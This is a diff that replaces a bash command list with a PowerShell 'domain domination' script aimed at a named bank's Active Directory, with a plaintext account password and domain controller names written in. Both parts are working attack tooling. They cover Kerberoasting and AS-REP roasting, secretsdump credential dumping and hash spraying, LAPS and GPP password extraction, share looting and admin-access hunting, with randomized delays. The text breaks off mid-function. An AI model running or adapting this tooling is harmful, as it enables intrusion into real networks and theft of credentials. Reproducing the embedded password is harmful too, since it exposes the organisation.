@@ -1,155 +1,942 @@
-Here are all the commands with your specific credentials and domains:
+# COMPLETE DOMAIN DOMINATION SCRIPT - PURE WINDOWS NATIVE VERSION
+# All Attack Vectors for Privilege Escalation - NO EXTERNAL TOOLS
 
-## **1. Initial Authentication Tests**
-```bash
-# Set variables
-USERNAME="vaptsupport2"
-PASSWORD="P\$ssme\$111"
-DOMAIN="FBNMERCHANTBANK.COM"
-DC1="mbd2-srvdc-101.FBNMERCHANTBANK.COM"
-DC2="mbd1-srvdc-102.FBNMERCHANTBANK.COM" 
-DC3="mbd1-srvdc-101.FBNMERCHANTBANK.COM"
+param(
+    [string]$USERNAME = "vaptsupport2",
+    [string]$PASSWORD = "P`$ssme`$111", 
+    [string]$DOMAIN = "FBNMERCHANTBANK.COM",
+    [string[]]$DOMAIN_CONTROLLERS = @("mbd2-srvdc-101.FBNMERCHANTBANK.COM", "mbd1-srvdc-102.FBNMERCHANTBANK.COM", "mbd1-srvdc-101.FBNMERCHANTBANK.COM"),
+    [string[]]$SUBNETS = @("172.41.0.4", "172.17.0.5", "172.17.0.4")
+)
 
-# Test each DC
-ldapsearch -x -H ldap://$DC1 -D "$USERNAME@$DOMAIN" -w "$PASSWORD" -b "DC=FBNMERCHANTBANK,DC=COM" -LLL "(objectClass=user)" cn | head -5
+# Configuration
+$MAX_RETRIES = 2
+$DELAY_MIN = 2
+$DELAY_MAX = 5
+$OUTPUT_DIR = "C:\temp\full_domination_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
+$CRITICAL_FINDINGS = "$OUTPUT_DIR\CRITICAL_FINDINGS.txt"
 
-ldapsearch -x -H ldap://$DC2 -D "$USERNAME@$DOMAIN" -w "$PASSWORD" -b "DC=FBNMERCHANTBANK,DC=COM" -LLL "(objectClass=user)" cn | head -5
+# Create output directory
+New-Item -ItemType Directory -Path $OUTPUT_DIR -Force | Out-Null
+New-Item -ItemType File -Path $CRITICAL_FINDINGS -Force | Out-Null
 
-ldapsearch -x -H ldap://$DC3 -D "$USERNAME@$DOMAIN" -w "$PASSWORD" -b "DC=FBNMERCHANTBANK,DC=COM" -LLL "(objectClass=user)" cn | head -5
-```
+# Logging functions
+function Log-Success { 
+    Write-Host "[+] $args" -ForegroundColor Green
+    Add-Content -Path $CRITICAL_FINDINGS -Value "[+] $args"
+}
+function Log-Info { 
+    Write-Host "[*] $args" -ForegroundColor Blue
+}
+function Log-Warning { 
+    Write-Host "[!] $args" -ForegroundColor Yellow
+    Add-Content -Path $CRITICAL_FINDINGS -Value "[!] $args"
+}
+function Log-Error { 
+    Write-Host "[-] $args" -ForegroundColor Red
+}
+function Log-Critical { 
+    Write-Host "[CRITICAL] $args" -ForegroundColor Red -BackgroundColor Black
+    Add-Content -Path $CRITICAL_FINDINGS -Value "[CRITICAL] $args"
+}
 
-## **2. Computer Enumeration**
-```bash
-# Get all domain computers from each DC
-ldapsearch -x -H ldap://$DC1 -D "$USERNAME@$DOMAIN" -w "$PASSWORD" -b "DC=FBNMERCHANTBANK,DC=COM" "(objectCategory=computer)" name | grep "name:" | awk '{print $2}' > computers_dc1.txt
+# Utility functions
+function Random-Delay {
+    Start-Sleep -Seconds (Get-Random -Minimum $DELAY_MIN -Maximum ($DELAY_MAX + 1))
+}
 
-ldapsearch -x -H ldap://$DC2 -D "$USERNAME@$DOMAIN" -w "$PASSWORD" -b "DC=FBNMERCHANTBANK,DC=COM" "(objectCategory=computer)" name | grep "name:" | awk '{print $2}' > computers_dc2.txt
-
-# Check local admin on first few computers
-head -10 computers_dc1.txt | while read computer; do
-    crackmapexec smb $computer -u $USERNAME -p "$PASSWORD" -d $DOMAIN --local-auth
-done
-```
-
-## **3. Shares Enumeration**
-```bash
-# Enumerate shares on each DC
-crackmapexec smb $DC1 -u $USERNAME -p "$PASSWORD" -d $DOMAIN --shares
-crackmapexec smb $DC2 -u $USERNAME -p "$PASSWORD" -d $DOMAIN --shares
-crackmapexec smb $DC3 -u $USERNAME -p "$PASSWORD" -d $DOMAIN --shares
-
-# Browse SYSVOL on each DC
-smbclient -U "FBNMERCHANTBANK.COM/vaptsupport2%P\$ssme\$111" "//$DC1/SYSVOL" -c "ls; quit"
-smbclient -U "FBNMERCHANTBANK.COM/vaptsupport2%P\$ssme\$111" "//$DC2/SYSVOL" -c "ls; quit"
-```
-
-## **4. Kerberos Attacks**
-```bash
-# AS-REP Roasting on each DC
-python3 /home/vaptsupport2/impacket/examples/GetNPUsers.py -dc-ip $DC1 "FBNMERCHANTBANK.COM/vaptsupport2:P\$ssme\$111" -request -format hashcat -outputfile asrep_dc1.txt
-python3 /home/vaptsupport2/impacket/examples/GetNPUsers.py -dc-ip $DC2 "FBNMERCHANTBANK.COM/vaptsupport2:P\$ssme\$111" -request -format hashcat -outputfile asrep_dc2.txt
-
-# Kerberoasting on each DC
-python3 /home/vaptsupport2/impacket/examples/GetUserSPNs.py -dc-ip $DC1 "FBNMERCHANTBANK.COM/vaptsupport2:P\$ssme\$111" -request -outputfile kerberoast_dc1.txt
-python3 /home/vaptsupport2/impacket/examples/GetUserSPNs.py -dc-ip $DC2 "FBNMERCHANTBANK.COM/vaptsupport2:P\$ssme\$111" -request -outputfile kerberoast_dc2.txt
-
-# Find Delegation
-python3 /home/vaptsupport2/impacket/examples/findDelegation.py -dc-ip $DC1 "FBNMERCHANTBANK.COM/vaptsupport2:P\$ssme\$111"
-python3 /home/vaptsupport2/impacket/examples/findDelegation.py -dc-ip $DC2 "FBNMERCHANTBANK.COM/vaptsupport2:P\$ssme\$111"
-```
-
-## **5. LAPS Exploitation**
-```bash
-# Find LAPS passwords from each DC
-ldapsearch -x -H ldap://$DC1 -D "$USERNAME@$DOMAIN" -w "$PASSWORD" -b "DC=FBNMERCHANTBANK,DC=COM" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd distinguishedName > laps_dc1.txt
-ldapsearch -x -H ldap://$DC2 -D "$USERNAME@$DOMAIN" -w "$PASSWORD" -b "DC=FBNMERCHANTBANK,DC=COM" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd distinguishedName > laps_dc2.txt
-
-# Extract and test LAPS passwords
-grep -B1 "ms-MCS-AdmPwd:" laps_dc1.txt | grep "distinguishedName:" | cut -d, -f2 | cut -d= -f2 > laps_computers.txt
-grep "ms-MCS-AdmPwd:" laps_dc1.txt | cut -d: -f2- | sed 's/^ *//' > laps_passwords.txt
-
-# Test first LAPS computer
-if [ -s laps_computers.txt ]; then
-    first_computer=$(head -1 laps_computers.txt)
-    first_password=$(head -1 laps_passwords.txt)
-    crackmapexec smb $first_computer -u administrator -p "$first_password" -d $DOMAIN
-fi
-```
-
-## **6. GPO Checks**
-```bash
-# Enumerate GPOs
-ldapsearch -x -H ldap://$DC1 -D "$USERNAME@$DOMAIN" -w "$PASSWORD" -b "CN=Policies,CN=System,DC=FBNMERCHANTBANK,DC=COM" objectClass=groupPolicyContainer > gpos.txt
-
-# Check GPO vulnerabilities
-python3 /home/vaptsupport2/impacket/examples/gpovuln.py -dc-ip $DC1 "FBNMERCHANTBANK.COM/vaptsupport2:P\$ssme\$111"
-```
-
-## **7. MSSQL Exploitation**
-```bash
-# Find MSSQL instances
-python3 /home/vaptsupport2/impacket/examples/mssqlinstance.py -dc-ip $DC1 "FBNMERCHANTBANK.COM/vaptsupport2:P\$ssme\$111" > mssql_instances.txt
-
-# Test connection to first MSSQL instance
-if [ -s mssql_instances.txt ]; then
-    first_mssql=$(head -1 mssql_instances.txt | awk '{print $1}')
-    python3 /home/vaptsupport2/impacket/examples/mssqlclient.py "FBNMERCHANTBANK.COM/vaptsupport2:P\$ssme\$111@$first_mssql" -windows-auth -query "SELECT SYSTEM_USER;"
-fi
-```
-
-## **8. Credential Dumping**
-```bash
-# First find computers where you have local admin
-crackmapexec smb $DC1 -u $USERNAME -p "$PASSWORD" -d $DOMAIN --local-auth | grep PWNED | awk '{print $4}' > pwned_machines.txt
-
-# Dump secrets from first pwned machine
-if [ -s pwned_machines.txt ]; then
-    first_pwned=$(head -1 pwned_machines.txt)
-    python3 /home/vaptsupport2/impacket/examples/secretsdump.py "FBNMERCHANTBANK.COM/vaptsupport2:P\$ssme\$111@$first_pwned" > dump_$first_pwned.txt
+function Invoke-WithRetry {
+    param(
+        [scriptblock]$ScriptBlock,
+        [string]$Description,
+        [int]$MaxRetries = $MAX_RETRIES
+    )
     
-    # Extract NTLM hashes
-    grep ".*:.*:[a-f0-9]\{32\}.*" dump_$first_pwned.txt | cut -d: -f4 > ntlm_hashes.txt
-fi
-```
+    $retryCount = 0
+    while ($retryCount -le $MaxRetries) {
+        try {
+            $result = & $ScriptBlock
+            return $result
+        }
+        catch {
+            $retryCount++
+            if ($retryCount -le $MaxRetries) {
+                Log-Warning "Retrying $Description... (attempt $retryCount/$MaxRetries)"
+                Random-Delay
+            }
+        }
+    }
+    Log-Error "Failed: $Description after $MaxRetries attempts"
+    return $null
+}
 
-## **9. BloodHound Collection**
-```bash
-# Collect BloodHound data from primary DC
-python3 /home/vaptsupport2/BloodHound.py/bloodhound.py -d FBNMERCHANTBANK.COM -dc $DC1 -u vaptsupport2 -p "P\$ssme\$111" -c All,LoggedOn --zip
-```
+function Test-Port {
+    param([string]$Computer, [int]$Port, [int]$Timeout = 1000)
+    
+    try {
+        $tcpClient = New-Object System.Net.Sockets.TcpClient
+        $result = $tcpClient.BeginConnect($Computer, $Port, $null, $null)
+        $success = $result.AsyncWaitHandle.WaitOne($Timeout, $false)
+        if ($success) {
+            $tcpClient.EndConnect($result)
+            $tcpClient.Close()
+            return $true
+        }
+        $tcpClient.Close()
+        return $false
+    }
+    catch {
+        return $false
+    }
+}
 
-## **10. Quick Comprehensive Test**
-```bash
-# One-liner to test basic functionality across all DCs
-for DC in $DC1 $DC2 $DC3; do
-    echo "=== Testing $DC ==="
-    crackmapexec smb $DC -u $USERNAME -p "$PASSWORD" -d $DOMAIN --shares
-    python3 /home/vaptsupport2/impacket/examples/GetNPUsers.py -dc-ip $DC "FBNMERCHANTBANK.COM/vaptsupport2:P\$ssme\$111" -request 2>/dev/null | head -5
-    echo ""
-done
-```
+# Banner
+Write-Host @"
 
-## **11. Password Spraying Preparation**
-```bash
-# If you get hashes from dumping, spray them
-if [ -s ntlm_hashes.txt ]; then
-    for hash in $(sort -u ntlm_hashes.txt | head -5); do
-        echo "Spraying hash: $hash"
-        crackmapexec smb --computers computers_dc1.txt -u administrator -H "$hash" -d $DOMAIN --no-bruteforce
-    done
-fi
-```
+    ____                            _         _       ____                                  _   _               
+   |  _ \ ___  ___ _ __ _   _ _ __ | |_ ___  | |     |  _ \ ___  ___  ___  _   _ _ __   ___| |_(_)_ __   __ _  
+   | |_) / _ \/ __| '__| | | | '_ \| __/ _ \ | |     | | | / _ \/ __|/ _ \| | | | '_ \ / __| __| | '_ \ / _` | 
+   |  __/ (_) \__ \ |  | |_| | |_) | ||  __/ | |     | |_| | (_) \__ \ (_) | |_| | | | | (__| |_| | | | | (_| | 
+   |_|   \___/|___/_|   \__, | .__/ \__\___| |_|     |____/ \___/|___/\___/ \__,_|_| |_|\___|\__|_|_| |_|\__, | 
+                        |___/|_|                                                                        |___/  
+"@ -ForegroundColor Red
 
-## **12. Service-Specific Attacks**
-```bash
-# Check for WinRM access
-crackmapexec winrm $DC1 -u $USERNAME -p "$PASSWORD" -d $DOMAIN
+# Enhanced credential validation using pure native methods
+function Test-DomainConnectivity {
+    Log-Info "Testing domain connectivity to $DOMAIN"
+    
+    try {
+        # Method 1: Try DirectoryEntry (pure .NET)
+        $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($DOMAIN_CONTROLLERS[0])", $USERNAME, $PASSWORD)
+        if ($de.Name) {
+            Log-Success "Successfully authenticated as $DOMAIN\$USERNAME via DirectoryEntry"
+            return $true
+        }
+    }
+    catch {
+        Log-Warning "DirectoryEntry authentication failed: $($_.Exception.Message)"
+    }
+    
+    try {
+        # Method 2: Try net use (native Windows)
+        $null = net use "\\$($DOMAIN_CONTROLLERS[0])\IPC$" /user:$DOMAIN\$USERNAME $PASSWORD 2>&1
+        if ($LASTEXITCODE -eq 0) {
+            Log-Success "Successfully authenticated as $DOMAIN\$USERNAME via net use"
+            # Clean up
+            net use "\\$($DOMAIN_CONTROLLERS[0])\IPC$" /delete 2>&1 | Out-Null
+            return $true
+        }
+    }
+    catch {
+        Log-Warning "Net use authentication failed"
+    }
+    
+    try {
+        # Method 3: Try WMI
+        $credential = New-Object System.Management.Automation.PSCredential("$DOMAIN\$USERNAME", (ConvertTo-SecureString $PASSWORD -AsPlainText -Force))
+        $computerSystem = Get-WmiObject -Class Win32_ComputerSystem -ComputerName $DOMAIN_CONTROLLERS[0] -Credential $credential -ErrorAction Stop
+        if ($computerSystem) {
+            Log-Success "Successfully authenticated as $DOMAIN\$USERNAME via WMI"
+            return $true
+        }
+    }
+    catch {
+        Log-Warning "WMI authentication failed"
+    }
+    
+    Log-Error "All domain authentication methods failed. Check credentials and connectivity."
+    return $false
+}
 
-# Check RDP access
-crackmapexec rdp $DC1 -u $USERNAME -p "$PASSWORD" -d $DOMAIN
+# 1. FIND WHERE YOU HAVE LOCAL ADMIN - PURE NATIVE
+function Find-AdminAccess {
+    Log-Info "[1] HUNTING LOCAL ADMIN ACCESS"
+    
+    # Get all domain computers using pure native methods
+    $allComputers = @()
+    
+    # Method 1: ADSI DirectorySearcher (native .NET)
+    try {
+        $domainDN = "DC=" + $DOMAIN.Replace(".", ",DC=")
+        $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$($DOMAIN_CONTROLLERS[0])/$domainDN")
+        $searcher.Filter = "(objectCategory=computer)"
+        $searcher.PageSize = 1000
+        $computers = $searcher.FindAll()
+        $allComputers += $computers | ForEach-Object { $_.Properties.name[0] }
+        Log-Info "Found $($computers.Count) computers via ADSI"
+    }
+    catch {
+        Log-Warning "ADSI computer enumeration failed: $($_.Exception.Message)"
+    }
+    
+    # Method 2: Net command (native Windows)
+    try {
+        $netView = net view /domain:$DOMAIN 2>&1
+        $netComputers = $netView | Where-Object { $_ -match "\\\\" } | ForEach-Object { ($_ -split "\\\\")[1] -replace "\s+.*", "" }
+        $allComputers += $netComputers | Where-Object { $_ -and $_ -notmatch "command completed successfully" }
+        Log-Info "Found $($netComputers.Count) computers via net view"
+    }
+    catch {
+        Log-Warning "Net view enumeration failed"
+    }
+    
+    # Method 3: Nltest (native Windows)
+    try {
+        $nltestOutput = nltest /dclist:$DOMAIN 2>&1
+        $dcComputers = $nltestOutput | Where-Object { $_ -match "\\\\" } | ForEach-Object { ($_ -split "\\\\")[1] -replace "\s+.*", "" }
+        $allComputers += $dcComputers
+        Log-Info "Found $($dcComputers.Count) DCs via nltest"
+    }
+    catch {
+        Log-Warning "Nltest enumeration failed"
+    }
+    
+    $allComputers = $allComputers | Sort-Object -Unique | Where-Object { $_ -and $_.Trim() -ne "" }
+    $allComputers | Out-File "$OUTPUT_DIR\all_computers.txt"
+    
+    $computerCount = $allComputers.Count
+    Log-Info "Found $computerCount unique computers in domain"
+    
+    if ($computerCount -eq 0) {
+        Log-Warning "No computers found in domain"
+        return
+    }
+    
+    # Test for admin access using multiple native methods
+    Log-Info "Checking local admin rights on first 50 computers..."
+    $quickTargets = $allComputers | Select-Object -First 50
+    
+    $pwnedMachines = @()
+    foreach ($computer in $quickTargets) {
+        if (Test-AdminAccess -Computer $computer) {
+            $pwnedMachines += $computer
+            Log-Success "Local admin on: $computer"
+        }
+        Random-Delay
+    }
+    
+    $pwnedMachines | Out-File "$OUTPUT_DIR\pwned_machines.txt"
+    Log-Success "You have local admin on $($pwnedMachines.Count) machines"
+    
+    if ($pwnedMachines.Count -gt 0) {
+        Log-Critical "LOCAL ADMIN ACCESS: You have local admin on $($pwnedMachines -join ', ')"
+    }
+}
 
-# Check SSH access  
-crackmapexec ssh $DC1 -u $USERNAME -p "$PASSWORD" -d $DOMAIN
-```
+function Test-AdminAccess {
+    param([string]$Computer)
+    
+    # Method 1: WMI (native)
+    try {
+        Get-WmiObject -Class Win32_ComputerSystem -ComputerName $Computer -ErrorAction Stop | Out-Null
+        return $true
+    }
+    catch { }
+    
+    # Method 2: Service control (native)
+    try {
+        Get-Service -Name "Spooler" -ComputerName $Computer -ErrorAction Stop | Out-Null
+        return $true
+    }
+    catch { }
+    
+    # Method 3: File system access (native)
+    try {
+        $testPath = "\\$Computer\C$\Windows\Temp"
+        if (Test-Path $testPath) {
+            return $true
+        }
+    }
+    catch { }
+    
+    # Method 4: Registry access (native)
+    try {
+        $null = reg query "\\$Computer\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion" /v CommonFilesDir 2>$null
+        return $true
+    }
+    catch { }
+    
+    return $false
+}
 
-**Start with the quick comprehensive test (#10) to see which DCs are responding, then focus on the ones that work!**
+# 2. COMPREHENSIVE SHARES ENUMERATION - PURE NATIVE
+function Find-Shares {
+    Log-Info "[2] DEEP SHARES ENUMERATION & EXPLOITATION"
+    
+    # Enumerate shares on all domain controllers
+    foreach ($dc in $DOMAIN_CONTROLLERS) {
+        Log-Info "Enumerating shares on DC: $dc"
+        Get-SharesOnComputer -Computer $dc
+    }
+    
+    # Enumerate shares on pwned machines
+    if (Test-Path "$OUTPUT_DIR\pwned_machines.txt") {
+        $pwnedMachines = Get-Content "$OUTPUT_DIR\pwned_machines.txt"
+        foreach ($machine in $pwnedMachines) {
+            Log-Info "Enumerating shares on pwned machine: $machine"
+            try {
+                Get-SharesOnComputer -Computer $machine
+            }
+            catch {
+                Log-Error "Failed to enumerate shares on $machine"
+            }
+            Random-Delay
+        }
+    }
+    
+    # Check SYSVOL for Group Policy Preferences passwords
+    Find-GPPPasswords
+}
+
+function Get-SharesOnComputer {
+    param([string]$Computer)
+    
+    try {
+        # Method 1: WMI (native)
+        $shares = Get-WmiObject -Class Win32_Share -ComputerName $Computer -ErrorAction Stop
+        $shares | Format-Table -AutoSize | Out-String -Width 4096 | Out-File "$OUTPUT_DIR\shares_$Computer.txt"
+        
+        foreach ($share in $shares) {
+            Log-Info "Found share on $Computer : \\$Computer\$($share.Name) (Type: $($share.Type))"
+            
+            if ($share.Type -eq 0) {  # Disk Drive
+                Find-InterestingFiles -Computer $Computer -Share $share.Name
+            }
+            
+            # Check for SYSVOL and NETLOGON
+            if ($share.Name -eq "SYSVOL" -or $share.Name -eq "NETLOGON") {
+                Log-Warning "Critical share found: \\$Computer\$($share.Name)"
+                Find-GPPPasswords -Computer $Computer -Share $share.Name
+            }
+        }
+        return $true
+    }
+    catch {
+        Log-Error "Failed to enumerate shares on $Computer : $($_.Exception.Message)"
+        return $false
+    }
+}
+
+function Find-InterestingFiles {
+    param([string]$Computer, [string]$Share)
+    
+    try {
+        $sharePath = "\\$Computer\$Share"
+        Log-Info "Exploring share: $sharePath"
+        
+        # Get files (first level only for performance)
+        $files = Get-ChildItem -Path $sharePath -ErrorAction SilentlyContinue -File
+        
+        foreach ($file in $files) {
+            if ($file.Name -match "\.(xml|config|bat|ps1|vbs|txt|ini)$" -or $file.Name -match "passw|cred|secur|unattend|web\.config") {
+                Log-Warning "Interesting file found: $($file.FullName)"
+                
+                # Copy file for analysis
+                $destDir = "$OUTPUT_DIR\shares\$Computer\$Share"
+                New-Item -ItemType Directory -Path $destDir -Force | Out-Null
+                try {
+                    Copy-Item -Path $file.FullName -Destination $destDir -ErrorAction Stop
+                    Log-Success "Copied: $($file.Name)"
+                    
+                    # Check for passwords in files
+                    Search-FileForPasswords -FilePath (Join-Path $destDir $file.Name)
+                }
+                catch {
+                    Log-Error "Failed to copy $($file.Name)"
+                }
+            }
+        }
+    }
+    catch {
+        # Access denied or other issues
+    }
+}
+
+function Find-GPPPasswords {
+    param([string]$Computer = $DOMAIN_CONTROLLERS[0], [string]$Share = "SYSVOL")
+    
+    Log-Info "Checking for Group Policy Preferences passwords in SYSVOL"
+    
+    try {
+        $sysvolPath = "\\$Computer\$Share\$DOMAIN\Policies"
+        if (Test-Path $sysvolPath) {
+            $xmlFiles = Get-ChildItem -Path $sysvolPath -Recurse -Filter "Groups.xml" -ErrorAction SilentlyContinue
+            $xmlFiles += Get-ChildItem -Path $sysvolPath -Recurse -Filter "*.xml" -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "Services|ScheduledTasks" }
+            
+            foreach ($xmlFile in $xmlFiles) {
+                $content = Get-Content -Path $xmlFile.FullName -Raw -ErrorAction SilentlyContinue
+                if ($content -match "cpassword") {
+                    Log-Critical "GPP PASSWORD FOUND: $($xmlFile.FullName)"
+                    
+                    # Extract the cpassword value
+                    if ($content -match "cpassword=`"([^`"]+)`"") {
+                        $cpassword = $matches[1]
+                        Log-Critical "GPP cpassword: $cpassword"
+                        Add-Content -Path "$OUTPUT_DIR\gpp_passwords.txt" -Value "File: $($xmlFile.FullName)"
+                        Add-Content -Path "$OUTPUT_DIR\gpp_passwords.txt" -Value "cpassword: $cpassword"
+                        Add-Content -Path "$OUTPUT_DIR\gpp_passwords.txt" -Value "Decrypt with: gpp-decrypt $cpassword"
+                        Add-Content -Path "$OUTPUT_DIR\gpp_passwords.txt" -Value ""
+                    }
+                }
+            }
+        }
+    }
+    catch {
+        Log-Error "Failed to check GPP passwords: $($_.Exception.Message)"
+    }
+}
+
+function Search-FileForPasswords {
+    param([string]$FilePath)
+    
+    try {
+        $content = Get-Content -Path $FilePath -ErrorAction Stop -Raw
+        $patterns = @(
+            "password[=:]\s*([^\s]+)",
+            "pwd[=:]\s*([^\s]+)", 
+            "credential[=:]\s*([^\s]+)",
+            "connectionstring.*password=([^;]+)",
+            "<add.*password=`"([^`"]+)`"",
+            "encryptionkey.*=.*([^\s]+)"
+        )
+        
+        foreach ($pattern in $patterns) {
+            if ($content -match $pattern) {
+                Log-Critical "POTENTIAL PASSWORD FOUND in $([System.IO.Path]::GetFileName($FilePath)): $($matches[1])"
+                Add-Content -Path "$OUTPUT_DIR\found_passwords.txt" -Value "File: $FilePath"
+                Add-Content -Path "$OUTPUT_DIR\found_passwords.txt" -Value "Pattern: $pattern"
+                Add-Content -Path "$OUTPUT_DIR\found_passwords.txt" -Value "Match: $($matches[1])"
+                Add-Content -Path "$OUTPUT_DIR\found_passwords.txt" -Value ""
+                break
+            }
+        }
+    }
+    catch {
+        # File might be binary or locked
+    }
+}
+
+# 3. COMPREHENSIVE KERBEROS ATTACKS - PURE NATIVE
+function Invoke-KerberosAttacks {
+    Log-Info "[3] COMPREHENSIVE KERBEROS ATTACKS"
+    
+    # Check for Kerberos delegation
+    Find-Delegation
+    
+    # Look for service accounts that might be kerberoastable
+    Find-ServiceAccounts
+    
+    # Find users with pre-auth disabled (AS-REP Roastable)
+    Find-ASREPRoastable
+}
+
+function Find-Delegation {
+    Log-Info "Finding delegation configurations"
+    
+    try {
+        $domainDN = "DC=" + $DOMAIN.Replace(".", ",DC=")
+        $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$($DOMAIN_CONTROLLERS[0])/$domainDN")
+        
+        # Unconstrained delegation
+        $searcher.Filter = "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
+        $unconstrained = $searcher.FindAll()
+        
+        foreach ($account in $unconstrained) {
+            $name = $account.Properties.name[0]
+            Log-Critical "UNCONSTRAINED DELEGATION: $name"
+            Add-Content -Path "$OUTPUT_DIR\delegation.txt" -Value "UNCONSTRAINED`t$name"
+        }
+        
+        # Constrained delegation
+        $searcher.Filter = "(userAccountControl:1.2.840.113556.1.4.803:=16777216)"
+        $constrained = $searcher.FindAll()
+        
+        foreach ($account in $constrained) {
+            $name = $account.Properties.name[0]
+            $spns = if ($account.Properties.serviceprincipalname) { $account.Properties.serviceprincipalname -join ";" } else { "None" }
+            Log-Critical "CONSTRAINED DELEGATION: $name - SPNs: $spns"
+            Add-Content -Path "$OUTPUT_DIR\delegation.txt" -Value "CONSTRAINED`t$name`t$spns"
+        }
+        
+        Log-Success "Found $($unconstrained.Count) unconstrained and $($constrained.Count) constrained delegation accounts"
+    }
+    catch {
+        Log-Error "Failed to find delegation: $($_.Exception.Message)"
+    }
+}
+
+function Find-ServiceAccounts {
+    Log-Info "Finding service accounts for Kerberoasting"
+    
+    try {
+        $domainDN = "DC=" + $DOMAIN.Replace(".", ",DC=")
+        $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$($DOMAIN_CONTROLLERS[0])/$domainDN")
+        $searcher.Filter = "(&(objectCategory=user)(servicePrincipalName=*))"
+        $serviceAccounts = $searcher.FindAll()
+        
+        foreach ($account in $serviceAccounts) {
+            $name = $account.Properties.name[0]
+            $spns = $account.Properties.serviceprincipalname -join "; "
+            Log-Info "Service account found: $name with SPNs: $spns"
+            Add-Content -Path "$OUTPUT_DIR\service_accounts.txt" -Value "$name`t$spns"
+        }
+        
+        Log-Success "Found $($serviceAccounts.Count) service accounts with SPNs"
+    }
+    catch {
+        Log-Error "Failed to find service accounts: $($_.Exception.Message)"
+    }
+}
+
+function Find-ASREPRoastable {
+    Log-Info "Finding AS-REP Roastable accounts (pre-auth disabled)"
+    
+    try {
+        $domainDN = "DC=" + $DOMAIN.Replace(".", ",DC=")
+        $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$($DOMAIN_CONTROLLERS[0])/$domainDN")
+        $searcher.Filter = "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
+        $asrepAccounts = $searcher.FindAll()
+        
+        foreach ($account in $asrepAccounts) {
+            $name = $account.Properties.name[0]
+            Log-Critical "AS-REP ROASTABLE: $name (pre-auth disabled)"
+            Add-Content -Path "$OUTPUT_DIR\asrep_accounts.txt" -Value $name
+        }
+        
+        Log-Success "Found $($asrepAccounts.Count) AS-REP roastable accounts"
+    }
+    catch {
+        Log-Error "Failed to find AS-REP roastable accounts: $($_.Exception.Message)"
+    }
+}
+
+# 4. LAPS EXPLOITATION - PURE NATIVE
+function Find-LAPS {
+    Log-Info "[4] LAPS EXPLOITATION"
+    
+    try {
+        $domainDN = "DC=" + $DOMAIN.Replace(".", ",DC=")
+        $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$($DOMAIN_CONTROLLERS[0])/$domainDN")
+        $searcher.Filter = "(ms-MCS-AdmPwd=*)"
+        $lapsComputers = $searcher.FindAll()
+        
+        $lapsCount = $lapsComputers.Count
+        if ($lapsCount -gt 0) {
+            Log-Critical "LAPS PASSWORDS: $lapsCount machines with readable LAPS passwords"
+            
+            foreach ($computer in $lapsComputers) {
+                $compName = $computer.Properties.name[0]
+                $lapsPassword = $computer.Properties.'ms-mcs-admpwd'[0]
+                Add-Content -Path "$OUTPUT_DIR\laps_passwords.txt" -Value "$compName`t$lapsPassword"
+                Log-Success "LAPS password for $compName : $lapsPassword"
+            }
+        }
+        else {
+            Log-Info "No LAPS passwords readable with current privileges"
+        }
+    }
+    catch {
+        Log-Error "Failed to query LAPS information: $($_.Exception.Message)"
+    }
+}
+
+# 5. GPO MISCONFIGURATION - PURE NATIVE
+function Find-GPOMisconfig {
+    Log-Info "[5] GPO MISCONFIGURATION CHECKS"
+    
+    # Check SYSVOL for GPOs and scripts
+    Find-GPOinSYSVOL
+}
+
+function Find-GPOinSYSVOL {
+    Log-Info "Checking SYSVOL for GPO data and misconfigurations"
+    
+    try {
+        $sysvolPath = "\\$($DOMAIN_CONTROLLERS[0])\SYSVOL\$DOMAIN\Policies"
+        if (Test-Path $sysvolPath) {
+            $gpoDirs = Get-ChildItem -Path $sysvolPath -Directory -ErrorAction SilentlyContinue
+            Log-Info "Found $($gpoDirs.Count) GPO directories in SYSVOL"
+            
+            foreach ($gpoDir in $gpoDirs) {
+                # Check for scripts in GPO
+                $scriptPath = Join-Path $gpoDir.FullName "Machine\Scripts\Startup"
+                if (Test-Path $scriptPath) {
+                    $scripts = Get-ChildItem -Path $scriptPath -Recurse -Filter "*.bat" -ErrorAction SilentlyContinue
+                    if ($scripts.Count -gt 0) {
+                        Log-Warning "GPO $($gpoDir.Name) contains startup scripts: $($scripts.Count) batch files"
+                    }
+                }
+                
+                $scriptPath = Join-Path $gpoDir.FullName "Machine\Scripts\Shutdown"
+                if (Test-Path $scriptPath) {
+                    $scripts = Get-ChildItem -Path $scriptPath -Recurse -Filter "*.bat" -ErrorAction SilentlyContinue
+                    if ($scripts.Count -gt 0) {
+                        Log-Warning "GPO $($gpoDir.Name) contains shutdown scripts: $($scripts.Count) batch files"
+                    }
+                }
+                
+                # Check for registry pol files
+                $polPath = Join-Path $gpoDir.FullName "Machine\Registry.pol"
+                if (Test-Path $polPath) {
+                    Log-Info "GPO $($gpoDir.Name) contains registry policies"
+                }
+            }
+        }
+    }
+    catch {
+        Log-Error "Failed to check SYSVOL GPOs: $($_.Exception.Message)"
+    }
+}
+
+# 6. MSSQL INSTANCE EXPLOITATION - PURE NATIVE
+function Find-MSSQL {
+    Log-Info "[6] MSSQL INSTANCE & TRUST EXPLOITATION"
+    
+    # Find MSSQL instances via port scanning
+    $mssqlInstances = @()
+    
+    foreach ($subnet in $SUBNETS) {
+        Log-Info "Scanning for MSSQL on: $subnet"
+        if (Test-Port -Computer $subnet -Port 1433) {
+            $mssqlInstances += $subnet
+            Log-Critical "MSSQL INSTANCE FOUND: $subnet"
+            Add-Content -Path "$OUTPUT_DIR\mssql_instances.txt" -Value $subnet
+        }
+    }
+    
+    # Also check domain computers for MSSQL
+    if (Test-Path "$OUTPUT_DIR\all_computers.txt") {
+        $computers = Get-Content "$OUTPUT_DIR\all_computers.txt" | Select-Object -First 20
+        foreach ($computer in $computers) {
+            if (Test-Port -Computer $computer -Port 1433) {
+                if ($mssqlInstances -notcontains $computer) {
+                    $mssqlInstances += $computer
